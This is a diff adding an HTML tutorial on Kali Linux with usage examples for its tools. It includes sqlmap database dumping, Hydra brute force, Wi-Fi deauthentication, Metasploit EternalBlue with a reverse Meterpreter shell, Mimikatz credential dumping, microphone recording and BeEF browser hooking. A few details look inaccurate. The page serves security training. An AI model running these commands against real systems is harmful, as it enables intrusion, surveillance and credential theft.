@@ -1,0 +1,847 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Complete Kali Linux Tutorial with Tool Usage Examples</title>
+    <style>
+        /* General Styles for the Tutorial Page */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            line-height: 1.7;
+            color: #1a202c;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 60px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(102, 126, 234, 0.1) 0%, transparent 70%);
+            animation: float 6s ease-in-out infinite;
+            pointer-events: none;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(180deg); }
+        }
+        
+        h1 {
+            font-size: 3.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-align: center;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        h1::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 4px;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            border-radius: 2px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        h2 {
+            color: #2d3748;
+            font-size: 2rem;
+            font-weight: 700;
+            margin: 50px 0 25px 0;
+            position: relative;
+            padding-left: 25px;
+            z-index: 1;
+        }
+        
+        h2::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 6px;
+            height: 40px;
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            border-radius: 3px;
+            box-shadow: 0 4px 8px rgba(102, 126, 234, 0.3);
+        }
+        
+        h3 {
+            color: #4a5568;
+            font-size: 1.4rem;
+            font-weight: 600;
+            margin: 30px 0 15px 0;
+            position: relative;
+            z-index: 1;
+        }
+        
+        h4 {
+            color: #667eea;
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin: 25px 0 10px 0;
+            position: relative;
+            z-index: 1;
+        }
+        
+        p {
+            margin-bottom: 16px;
+            font-size: 1.1rem;
+            color: #4a5568;
+            position: relative;
+            z-index: 1;
+        }
+        
+        code {
+            background: linear-gradient(135deg, #f7fafc 0%, #edf2f7 100%);
+            color: #667eea;
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
+            font-size: 0.9em;
+            font-weight: 500;
+            border: 1px solid #e2e8f0;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        pre {
+            background: linear-gradient(135deg, #1a202c 0%, #2d3748 100%);
+            color: #e2e8f0;
+            padding: 30px;
+            border-radius: 16px;
+            overflow-x: auto;
+            margin: 25px 0;
+            border: 1px solid #4a5568;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            position: relative;
+            z-index: 1;
+        }
+        
+        pre::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            border-radius: 16px 16px 0 0;
+        }
+        
+        pre code {
+            background: none;
+            color: inherit;
+            padding: 0;
+            border: none;
+            box-shadow: none;
+            font-size: 0.95em;
+        }
+        
+        .toc {
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1) 0%, rgba(118, 75, 162, 0.1) 100%);
+            padding: 35px;
+            border-radius: 16px;
+            margin-bottom: 50px;
+            border: 1px solid rgba(102, 126, 234, 0.2);
+            box-shadow: 0 8px 32px rgba(102, 126, 234, 0.15);
+            position: relative;
+            z-index: 1;
+        }
+        
+        .toc h2 {
+            margin-top: 0;
+            color: #667eea;
+            text-align: center;
+        }
+        
+        .toc ul {
+            list-style: none;
+            padding: 0;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .toc li {
+            margin: 0;
+            transition: transform 0.3s ease;
+        }
+        
+        .toc li:hover {
+            transform: translateX(5px);
+        }
+        
+        .toc a {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 500;
+            padding: 12px 16px;
+            border-radius: 8px;
+            display: block;
+            background: rgba(255, 255, 255, 0.7);
+            transition: all 0.3s ease;
+            border: 1px solid rgba(102, 126, 234, 0.2);
+        }
+        
+        .toc a:hover {
+            background: rgba(102, 126, 234, 0.1);
+            border-color: #667eea;
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.2);
+        }
+        
+        .highlight {
+            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
+            padding: 20px;
+            border-radius: 12px;
+            margin: 25px 0;
+            border-left: 5px solid #ffc107;
+            box-shadow: 0 4px 12px rgba(255, 193, 7, 0.2);
+            position: relative;
+            z-index: 1;
+        }
+        
+        .tip {
+            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
+            padding: 20px;
+            border-radius: 12px;
+            margin: 25px 0;
+            border-left: 5px solid #28a745;
+            box-shadow: 0 4px 12px rgba(40, 167, 69, 0.2);
+            position: relative;
+            z-index: 1;
+        }
+        
+        .tip::before {
+            content: '💡';
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            font-size: 1.5rem;
+        }
+        
+        .tip {
+            padding-left: 50px;
+        }
+        
+        .warning {
+            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
+            padding: 20px;
+            border-radius: 12px;
+            margin: 25px 0;
+            border-left: 5px solid #dc3545;
+            box-shadow: 0 4px 12px rgba(220, 53, 69, 0.2);
+            position: relative;
+            z-index: 1;
+        }
+        
+        .warning::before {
+            content: '⚠️';
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            font-size: 1.5rem;
+        }
+        
+        .warning {
+            padding-left: 50px;
+        }
+        
+        ol, ul {
+            margin-left: 25px;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        ol li, ul li {
+            margin-bottom: 8px;
+            font-size: 1.1rem;
+            color: #4a5568;
+        }
+        
+        /* Syntax highlighting for code blocks */
+        pre code .comment { color: #8b949e; }
+        pre code .keyword { color: #ff7b72; }
+        pre code .string { color: #a5d6ff; }
+        pre code .number { color: #79c0ff; }
+        pre code .operator { color: #ff7b72; }
+        
+        /* Responsive design */
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            
+            .container {
+                padding: 30px 20px;
+            }
+            
+            h1 {
+                font-size: 2.5rem;
+            }
+            
+            h2 {
+                font-size: 1.7rem;
+            }
+            
+            .toc ul {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        /* Smooth scrolling */
+        html {
+            scroll-behavior: smooth;
+        }
+        
+        /* Loading animation */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .container {
+            animation: fadeIn 0.8s ease-out;
+        }
+        
+        /* Interactive elements */
+        .interactive-section {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1) 0%, rgba(255, 255, 255, 0.05) 100%);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+            border: 1px solid rgba(102, 126, 234, 0.2);
+            transition: all 0.3s ease;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .interactive-section:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.15);
+        }
+        
+        @media print {
+            body { 
+                background: white; 
+                color: black;
+            }
+            .container { 
+                box-shadow: none; 
+                background: white;
+            }
+            pre { 
+                background-color: #f4f4f4; 
+                color: #333; 
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Complete Kali Linux Tutorial with Tool Usage Examples</h1>
+        
+        <div class="toc">
+            <h2>Table of Contents</h2>
+            <ul>
+                <li><a href="#what-is-kali-linux">1. What is Kali Linux?</a></li>
+                <li><a href="#installation-and-setup">2. Installation and Setup</a></li>
+                <li><a href="#basic-linux-commands">3. Basic Linux Commands</a></li>
+                <li><a href="#information-gathering-tools">4. Information Gathering Tools</a></li>
+                <li><a href="#vulnerability-analysis-tools">5. Vulnerability Analysis Tools</a></li>
+                <li><a href="#web-application-analysis-tools">6. Web Application Analysis Tools</a></li>
+                <li><a href="#password-attacks-tools">7. Password Attacks Tools</a></li>
+                <li><a href="#wireless-attacks-tools">8. Wireless Attacks Tools</a></li>
+                <li><a href="#exploitation-tools">9. Exploitation Tools</a></li>
+                <li><a href="#post-exploitation-tools">10. Post-Exploitation Tools</a></li>
+                <li><a href="#forensics-tools">11. Forensics Tools</a></li>
+                <li><a href="#social-engineering-tools">12. Social Engineering Tools</a></li>
+                <li><a href="#maintaining-and-updating-kali">13. Maintaining and Updating Kali</a></li>
+                <li><a href="#ethical-considerations">14. Ethical Considerations</a></li>
+            </ul>
+        </div>
+
+        <h2 id="what-is-kali-linux">1. What is Kali Linux?</h2>
+        <p><strong>Kali Linux</strong> is a Debian-based Linux distribution specifically designed for digital forensics and penetration testing. It's maintained and funded by Offensive Security. It comes pre-installed with hundreds of tools for various information security tasks, including:</p>
+        <ul>
+            <li>Penetration Testing</li>
+            <li>Security Research</li>
+            <li>Computer Forensics</li>
+            <li>Reverse Engineering</li>
+            <li>Vulnerability Assessment</li>
+        </ul>
+        <p>Kali Linux is widely used by cybersecurity professionals, ethical hackers, and security enthusiasts for testing the security of systems and networks.</p>
+
+        <h2 id="installation-and-setup">2. Installation and Setup</h2>
+        <p>The most common and recommended ways to use Kali Linux are:</p>
+        <ul>
+            <li><strong>Virtual Machine:</strong> Install on a hypervisor like VirtualBox or VMware Workstation/ESXi. This is the safest way as it isolates Kali from your host OS.</li>
+            <li><strong>Dual Boot:</strong> Install alongside an existing operating system (e.g., Windows). Requires careful partitioning.</li>
+            <li><strong>Live USB:</strong> Run directly from a USB drive without installation. Can be persistent (saves changes) or non-persistent.</li>
+            <li><strong>Cloud:</strong> Deploy a Kali instance on cloud platforms like AWS or Azure.</li>
+            <li><strong>WSL (Windows Subsystem for Linux):</strong> Run a Kali Linux environment directly on Windows 10/11.</li>
+        </ul>
+        <h3>Basic Setup Steps (Virtual Machine Example):</h3>
+        <ol>
+            <li>Download the official Kali Linux ISO from <a href="https://www.kali.org/get-kali/" target="_blank">kali.org/get-kali/</a>. Choose the appropriate architecture (64-bit).</li>
+            <li>Install VirtualBox or VMware Workstation on your host operating system.</li>
+            <li>Create a new virtual machine:
+                <ul>
+                    <li>Allocate sufficient RAM (e.g., 4GB or more).</li>
+                    <li>Allocate sufficient CPU cores (e.g., 2 cores).</li>
+                    <li>Create a virtual hard disk (e.g., 30GB or more, dynamically allocated).</li>
+                    <li>Mount the Kali Linux ISO as the virtual CD/DVD drive.</li>
+                </ul>
+            </li>
+            <li>Start the VM and follow the graphical installation steps (choose "Graphical install").</li>
+            <li>During installation, choose network configuration, user setup, and partitioning.</li>
+            <li>After installation, remove the ISO from the virtual drive and reboot.</li>
+            <li>Install VirtualBox Guest Additions or VMware Tools for better integration (e.g., full screen, shared clipboard).
+                <pre><code class="language-bash"># For VirtualBox Guest Additions inside Kali VM:
+sudo apt update
+sudo apt install -y linux-headers-$(uname -r)
+sudo mount /dev/cdrom /mnt
+sudo /mnt/VBoxLinuxAdditions.run # Run the installer from the mounted ISO
+sudo reboot</code></pre>
+            </li>
+        </ol>
+
+        <h2 id="basic-linux-commands">3. Basic Linux Commands</h2>
+        <p>Familiarity with the Linux command line (Bash) is essential for using Kali Linux effectively.</p>
+        <ul>
+            <li><strong>`ls`:</strong> List directory contents.
+                <pre><code class="language-bash">ls -la # list all files, long format
+ls /etc # list contents of /etc directory</code></pre>
+            </li>
+            <li><strong>`cd`:</strong> Change directory.
+                <pre><code class="language-bash">cd /opt/ # move to /opt directory
+cd ..    # move up one directory
+cd ~     # move to home directory</code></pre>
+            </li>
+            <li><strong>`pwd`:</strong> Print working directory.</li>
+            <li><strong>`mkdir`:</strong> Make directory.
+                <pre><code class="language-bash">mkdir mytools</code></pre>
+            </li>
+            <li><strong>`rm`:</strong> Remove files or directories.
+                <pre><code class="language-bash">rm myfile.txt # remove a file
+rm -r mydir   # remove a directory and its contents recursively</code></pre>
+            </li>
+            <li><strong>`cp`:</strong> Copy files or directories.
+                <pre><code class="language-bash">cp file1.txt /tmp/file1.txt
+cp -r mydir /opt/newdir</code></pre>
+            </li>
+            <li><strong>`mv`:</strong> Move or rename files/directories.
+                <pre><code class="language-bash">mv oldname.txt newname.txt
+mv file.txt /tmp/</code></pre>
+            </li>
+            <li><strong>`cat`:</strong> Concatenate and display file content.
+                <pre><code class="language-bash">cat /etc/passwd # display content of passwd file</code></pre>
+            </li>
+            <li><strong>`grep`:</strong> Search for patterns in files.
+                <pre><code class="language-bash">grep "root" /etc/passwd # find lines containing "root"</code></pre>
+            </li>
+            <li><strong>`man`:</strong> Display manual pages for commands.
+                <pre><code class="language-bash">man nmap # show manual for nmap tool</code></pre>
+            </li>
+            <li><strong>`sudo`:</strong> Execute a command as a superuser (root).
+                <pre><code class="language-bash">sudo apt update # update package lists with root privileges</code></pre>
+            </li>
+            <li><strong>`apt`:</strong> Package manager for Debian-based systems. Used for installing, updating, and removing software.
+                <pre><code class="language-bash">sudo apt update         # refresh package lists
+sudo apt upgrade        # upgrade installed packages
+sudo apt install toolname # install a new tool
+sudo apt remove toolname # remove a tool</code></pre>
+            </li>
+            <li><strong>`ip a`:</strong> Display network interface information.
+                <pre><code class="language-bash">ip a # show IP addresses, network interfaces</code></pre>
+            </li>
+            <li><strong>`ping`:</strong> Test network connectivity to a host.
+                <pre><code class="language-bash">ping google.com</code></pre>
+            </li>
+            <li><strong>`ifconfig` (Legacy, use `ip a`):</strong> Display network interface information.</li>
+        </ul>
+
+        <h2 id="information-gathering-tools">4. Information Gathering Tools</h2>
+        <p>These tools are used in the reconnaissance phase to collect data about targets without directly interacting with them (passive) or with minimal interaction (active).</p>
+
+        <h3>A. Nmap (Network Mapper)</h3>
+        <p>A powerful open-source tool for network discovery and security auditing. It can discover hosts and services on a computer network by sending packets and analyzing the responses.</p>
+        <ul>
+            <li><strong>Basic Port Scan:</strong> Discover open ports and services on a target.
+                <pre><code class="language-bash">nmap &lt;target_ip&gt; # default scan of 1000 common ports
+nmap -p 22,80,443 &lt;target_ip&gt; # scan specific ports
+nmap -p- &lt;target_ip&gt; # scan all 65535 ports</code></pre>
+            </li>
+            <li><strong>Service Version Detection (`-sV`):</strong> Attempts to determine the service name and version running on open ports.
+                <pre><code class="language-bash">nmap -sV &lt;target_ip&gt;</code></pre>
+            </li>
+            <li><strong>OS Detection (`-O`):</strong> Attempts to determine the operating system of the target.
+                <pre><code class="language-bash">nmap -O &lt;target_ip&gt;</code></pre>
+            </li>
+            <li><strong>Aggressive Scan (`-A`):</strong> Enables OS detection, version detection, script scanning, and traceroute.
+                <pre><code class="language-bash">nmap -A &lt;target_ip&gt;</code></pre>
+            </li>
+            <li><strong>Script Scanning (`-sC` or `--script`):</strong> Runs default or specific Nmap Scripting Engine (NSE) scripts for various tasks (vulnerability detection, misconfiguration, discovery).
+                <pre><code class="language-bash">nmap -sC &lt;target_ip&gt; # run default scripts
+nmap --script http-enum &lt;target_ip&gt; # enumerate web directories
+nmap --script vuln &lt;target_ip&gt; # check for common vulnerabilities</code></pre>
+            </li>
+        </ul>
+
+        <h3>B. Maltego</h3>
+        <p>A powerful open-source intelligence (OSINT) and graphical link analysis tool for gathering and connecting information for forensic analysis or penetration testing.</p>
+        <ul>
+            <li>Visualizes relationships between people, companies, domains, IP addresses, files, etc.</li>
+            <li>Uses "Transforms" to query various public data sources (DNS records, WHOIS, social media, etc.).</li>
+            <pre><code class="language-bash"># Start Maltego from the applications menu: Information Gathering -> Maltego</code></pre>
+            <p><strong>Usage:</strong> Drag entities (e.g., a "Domain" entity) onto the graph, then right-click and run transforms (e.g., "To Emails from Domain," "To DNS Names").</p>
+        </ul>
+
+        <h3>C. theHarvester</h3>
+        <p>Gathers open-source intelligence (OSINT) for a target domain, such as email addresses, subdomains, hosts, employee names, open ports, and banners.</p>
+        <pre><code class="language-bash">theharvester -d example.com -l 500 -b google,linkedin,bing
+
+# -d: target domain
+# -l: limit the number of results
+# -b: specify data sources (google, linkedin, bing, yahoo, shodan, etc.)</code></pre>
+
+        <h3>D. DNS Tools (dig, nslookup)</h3>
+        <p>Used to query DNS (Domain Name System) servers for information about domain names, IP addresses, and other DNS records.</p>
+        <pre><code class="language-bash">dig example.com MX        # Query MX (Mail Exchange) records
+dig example.com ANY       # Query all record types
+nslookup example.com      # Basic DNS lookup
+nslookup -type=ns example.com # Query Name Server records</code></pre>
+
+        <h2 id="vulnerability-analysis-tools">5. Vulnerability Analysis Tools</h2>
+        <p>Tools used to identify weaknesses in systems, applications, and networks.</p>
+
+        <h3>A. Nessus (Trial available) / OpenVAS</h3>
+        <p>Vulnerability scanners that identify known vulnerabilities, misconfigurations, and compliance issues in systems and applications. OpenVAS is open-source and comes pre-installed.</p>
+        <ul>
+            <li><strong>OpenVAS (Greenbone Vulnerability Manager):</strong>
+                <pre><code class="language-bash"># Start OpenVAS services:
+sudo gvm-start
+
+# Access via web browser: https://127.0.0.1:9392 (default creds will be provided on first start)</code></pre>
+                <p><strong>Usage:</strong> Configure a scan target, create a new task, and run a scan. Review the generated reports for identified vulnerabilities and their severity.</p>
+            </li>
+        </ul>
+
+        <h3>B. Nmap (NSE Scripts)</h3>
+        <p>As mentioned, Nmap's Scripting Engine (NSE) has many scripts for vulnerability detection.</p>
+        <pre><code class="language-bash">nmap --script vuln &lt;target_ip&gt; # Runs common vulnerability detection scripts
+nmap --script smtp-vuln-cve2010-4344 &lt;target_ip&gt; # Specific vulnerability check
+nmap --script smb-vuln* &lt;target_ip&gt; # Check for SMB vulnerabilities</code></pre>
+
+        <h3>C. Nikto</h3>
+        <p>A web server scanner that performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/CGIs, outdated server versions, and version specific problems.</p>
+        <pre><code class="language-bash">nikto -h http://example.com # Scan a web server
+nikto -h https://example.com -ssl # Scan HTTPS
+nikto -h example.com -port 80,443 # Scan specific ports</code></pre>
+
+        <h2 id="web-application-analysis-tools">6. Web Application Analysis Tools</h2>
+        <p>Tools designed to test the security of web applications.</p>
+
+        <h3>A. Burp Suite Community Edition</h3>
+        <p>An integrated platform for performing security testing of web applications. It includes various tools like a proxy, scanner, intruder, repeater, and decoder.</p>
+        <ul>
+            <li><strong>Proxy:</strong> Intercept, view, and modify HTTP/S traffic between your browser and the web server.
+                <pre><code class="language-bash"># Start Burp Suite from Applications -> Web Application Analysis -> Burp Suite</code></pre>
+                <p><strong>Usage:</strong> Configure your browser's proxy settings to point to Burp's proxy (default: 127.0.0.1:8080). Turn "Intercept is on" in Burp's Proxy tab to capture requests.</p>
+            </li>
+            <li><strong>Repeater:</strong> Manually modify and resend individual HTTP requests, and analyze the responses.</li>
+            <li><strong>Intruder:</strong> Automate customized attacks on web applications, such as brute-forcing, fuzzing, and credential stuffing.</li>
+        </ul>
+
+        <h3>B. OWASP ZAP (Zed Attack Proxy)</h3>
+        <p>Another popular open-source web application security scanner. Similar to Burp Suite, it provides automated and manual testing capabilities.</p>
+        <pre><code class="language-bash"># Start OWASP ZAP from Applications -> Web Application Analysis -> OWASP ZAP</code></pre>
+        <p><strong>Usage:</strong> Use its "Automated Scan" for quick checks or manually explore and analyze requests via its proxy.</p>
+
+        <h3>C. SQLMap</h3>
+        <p>An open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.</p>
+        <pre><code class="language-bash">sqlmap -u "http://example.com/vuln_page.php?id=1" --dbs # enumerate databases
+sqlmap -u "http://example.com/vuln_page.php?id=1" -D database_name --tables # enumerate tables
+sqlmap -u "http://example.com/vuln_page.php?id=1" -D database_name -T table_name --dump # dump data from a table</code></pre>
+        <div class="warning">
+            <strong>Warning:</strong> Never use SQLMap on websites you do not have explicit permission to test, as it can cause damage to the database.
+        </div>
+
+        <h3>D. DirBuster / Gobuster / Ffuf</h3>
+        <p>Tools used for brute-forcing directories and files on web servers to discover hidden web content.</p>
+        <pre><code class="language-bash"># Gobuster example:
+gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+
+# -u: target URL
+# -w: wordlist to use
+# -x: file extensions to look for</code></pre>
+
+        <h2 id="password-attacks-tools">7. Password Attacks Tools</h2>
+        <p>Tools for cracking password hashes, brute-forcing login forms, or generating wordlists.</p>
+
+        <h3>A. Hashcat</h3>
+        <p>The world's fastest password cracker, supporting a wide range of hashing algorithms and attack modes (brute-force, dictionary, hybrid, mask, etc.).</p>
+        <ul>
+            <li><strong>Crack MD5 hash with a wordlist:</strong>
+                <pre><code class="language-bash">hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt # -m 0 for MD5, -a 0 for dictionary attack</code></pre>
+            </li>
+            <li><strong>Crack WPA/WPA2 handshake:</strong>
+                <pre><code class="language-bash">hashcat -m 2500 -a 3 capture.hccapx -1 ?l?d ?1?1?1?1?1?1?1?1 # -m 2500 for WPA, -a 3 for brute-force mask</code></pre>
+            </li>
+        </ul>
+        <p><strong>Note:</strong> Hashcat requires a GPU for optimal performance.</p>
+
+        <h3>B. John the Ripper (JtR)</h3>
+        <p>A fast password cracker, often used for UNIX password hashes, but capable of cracking many other hash types.</p>
+        <pre><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</code></pre>
+
+        <h3>C. Hydra</h3>
+        <p>A fast network logon cracker that supports numerous protocols to attack, including Telnet, FTP, HTTP, HTTPS, SMB, and many more.</p>
+        <pre><code class="language-bash">hydra -L users.txt -P passwords.txt ssh://&lt;target_ip&gt; # SSH brute-force with user/pass lists
+hydra -l admin -P passwords.txt ftp://&lt;target_ip&gt; # FTP brute-force with fixed user, pass list</code></pre>
+
+        <h3>D. CeWL</h3>
+        <p>A custom wordlist generator that crawls a given URL, to a specified depth, optionally following external links, and returns a list of unique words. This can be used to create targeted wordlists for password cracking.</p>
+        <pre><code class="language-bash">cewl -w mywordlist.txt -d 2 -m 5 http://example.com # crawl to depth 2, min word length 5</code></pre>
+
+        <h2 id="wireless-attacks-tools">8. Wireless Attacks Tools</h2>
+        <p>Tools for testing the security of wireless networks (Wi-Fi).</p>
+
+        <h3>A. Aircrack-ng Suite</h3>
+        <p>A complete suite of tools to assess Wi-Fi network security, including packet sniffing, WEP/WPA/WPA2 cracking, and fake access point creation.</p>
+        <ul>
+            <li><strong>Monitor Mode:</strong> Put your wireless adapter into monitor mode.
+                <pre><code class="language-bash">sudo airmon-ng check kill # Kill conflicting processes
+sudo airmon-ng start wlan0 # Replace wlan0 with your wireless adapter name</code></pre>
+            </li>
+            <li><strong>Scan for Networks:</strong> Discover nearby Wi-Fi networks.
+                <pre><code class="language-bash">sudo airodump-ng wlan0mon # Scan using the monitor interface</code></pre>
+            </li>
+            <li><strong>Deauthentication Attack (for WPA Handshake Capture):</strong> Disconnect clients from an AP to capture the 4-way handshake.
+                <pre><code class="language-bash">sudo aireplay-ng --deauth 0 -a &lt;BSSID_of_AP&gt; -c &lt;Client_MAC&gt; wlan0mon</code></pre>
+            </li>
+            <li><strong>Crack WPA/WPA2 Handshake:</strong> Use aircrack-ng with a wordlist to crack the captured handshake.
+                <pre><code class="language-bash">aircrack-ng -w /usr/share/wordlists/rockyou.txt captured_handshake.cap</code></pre>
+            </li>
+        </ul>
+        <div class="warning">
+            <strong>Warning:</strong> Using these tools on networks you do not own or have explicit permission to test is illegal and unethical. Ensure you are operating within a controlled lab environment.
+        </div>
+
+        <h3>B. Wifite2</h3>
+        <p>An automated wireless attack tool that wraps many Aircrack-ng functions into a single, easy-to-use script.</p>
+        <pre><code class="language-bash">sudo wifite --all # Attempts all known attacks against all nearby APs (use with extreme caution)
+sudo wifite --wept --wpat --wps # Target WEP, WPA, and WPS enabled networks
+sudo wifite --crack # Only crack captured handshakes</code></pre>
+
+        <h2 id="exploitation-tools">9. Exploitation Tools</h2>
+        <p>Tools used to gain unauthorized access to a system by leveraging identified vulnerabilities.</p>
+
+        <h3>A. Metasploit Framework</h3>
+        <p>The most widely used open-source exploitation framework. It contains a massive database of exploits, payloads, and post-exploitation modules for various systems and services.</p>
+        <ul>
+            <li><strong>Start Metasploit Console:</strong>
+                <pre><code class="language-bash">msfconsole</code></pre>
+            </li>
+            <li><strong>Search for an exploit:</strong>
+                <pre><code class="language-bash">search ms17-010 # Search for EternalBlue exploit
+search ftp backdoor</code></pre>
+            </li>
+            <li><strong>Use an exploit:</strong>
+                <pre><code class="language-bash">use exploit/windows/smb/ms17_010_eternalblue</code></pre>
+            </li>
+            <li><strong>Set Payload:</strong> A payload is the code that runs on the target after successful exploitation.
+                <pre><code class="language-bash">set PAYLOAD windows/meterpreter/reverse_tcp # Meterpreter is a powerful payload
+# For Linux: set PAYLOAD linux/x64/meterpreter/reverse_tcp</code></pre>
+            </li>
+            <li><strong>Set Options:</strong> Define parameters like target IP (RHOSTS), listening IP (LHOST), listening port (LPORT).
+                <pre><code class="language-bash">set RHOSTS &lt;target_ip&gt;
+set LHOST &lt;your_kali_ip&gt;
+set LPORT 4444
+show options # Review all set options</code></pre>
+            </li>
+            <li><strong>Exploit:</strong>
+                <pre><code class="language-bash">exploit</code></pre>
+            </li>
+        </ul>
+
+        <h3>B. Browser Exploitation Framework (BeEF)</h3>
+        <p>A penetration testing tool that focuses on the web browser. It's designed to demonstrate the impact of client-side vulnerabilities, often by hooking target browsers.</p>
+        <pre><code class="language-bash"># Start BeEF:
+sudo beef-xss
+
+# Access BeEF UI: http://127.0.0.1:3000/ui/panel (default creds: beef / beef)</code></pre>
+        <p><strong>Usage:</strong> The BeEF UI provides instructions on injecting a "hook" into a web page. When a victim's browser loads the hooked page, BeEF gains control over that browser, allowing various client-side attacks (e.g., phishing, stealing cookies, network pivoting).</p>
+
+        <h2 id="post-exploitation-tools">10. Post-Exploitation Tools</h2>
+        <p>Tools used after gaining initial access to a system, typically to escalate privileges, maintain persistence, and collect data.</p>
+
+        <h3>A. Meterpreter (from Metasploit)</h3>
+        <p>A powerful, advanced payload within Metasploit that provides an interactive shell with numerous post-exploitation capabilities.</p>
+        <pre><code class="language-bash"># After successful exploitation (in Metasploit console):
+# Standard Meterpreter commands:
+sysinfo                 # Get system information
+getuid                  # Get current user ID
+ps                      # List running processes
+upload /path/to/local/file.txt C:\\windows\\temp\\ # Upload a file
+download C:\\users\\victim\\secrets.txt /root/loot/ # Download a file
+shell                   # Drop into a native system shell
+migrate &lt;process_id&gt;    # Migrate to another process (for persistence)
+getsystem               # Attempt to get SYSTEM privileges
+hashdump                # Dump password hashes (requires elevated privileges)
+screenshot              # Take a screenshot of the target desktop
+record_mic -d 30        # Record 30 seconds from microphone</code></pre>
+
+        <h3>B. Mimikatz (Windows, often used with Meterpreter)</h3>
+        <p>A post-exploitation tool that extracts plaintexts, hashes, PIN codes, and Kerberos tickets from memory. It is often crucial for credential theft on Windows systems.</p>
+        <pre><code class="language-bash"># From a Meterpreter shell:
+load kiwi           # Load the Mimikatz module (previously 'kiwi')
+creds_all           # Show all credentials
+sekurlsa::logonpasswords # Dump hashes/passwords from active logon sessions</code></pre>
+
+        <h3>C. BloodHound (Requires Neo4j database)</h3>
+        <p>A tool that uses graph theory to reveal hidden and often unintended relationships within an Active Directory environment. It helps quickly identify complex attack paths for privilege escalation and lateral movement.</p>
+        <pre><code class="language-bash"># Start Neo4j database service (if not running):
+sudo neo4j start
+# Run BloodHound:
+bloodhound
+
+# Ingest data using SharpHound.exe (from a compromised Windows machine) or BloodHound.py (from Kali/Linux)
+# Example using BloodHound.py:
+python3 bloodhound.py -c All -d example.local -u user@example.local -p Password123! --dns-servers 192.168.1.10
+
+# Load the generated JSON files into BloodHound UI for visualization.</code></pre>
+
+        <h3>D. PowerShell Empire (Legacy but influential) / Covenant (Modern C2)</h3>
+        <p>Post-exploitation frameworks that use PowerShell (Empire) or .NET (Covenant) for command and control (C2) and various post-exploitation modules, often designed for stealth.</p>
+        <pre><code class="language-bash"># Start Covenant (requires .NET SDK on Kali):
+# navigate to Covenant/Covenant/
+dotnet run
+
+# Access Covenant UI: https://127.0.0.1:7443/ (default creds: Admin / 123)
+# Create a "Listener" (e.g., HTTP), generate a "Launcher" (payload),
+# deploy the launcher on a target, then use "Grinders" to interact and run modules.</code></pre>
+
+        <h2 id="forensics-tools">11. Forensics Tools</h2>
+        <p>While Kali is primarily offensive, it includes tools useful for digital forensics (collecting and analyzing evidence after a security incident).</p>
+
+        <h3>A. Autopsy</h3>
+        <p>A comprehensive digital forensics platform that allows you to analyze disk images or logical drives. It's often used for incident response or criminal investigations.</p>
+        <pre><code class="language-bash">autopsy # Start Autopsy UI</code></pre>
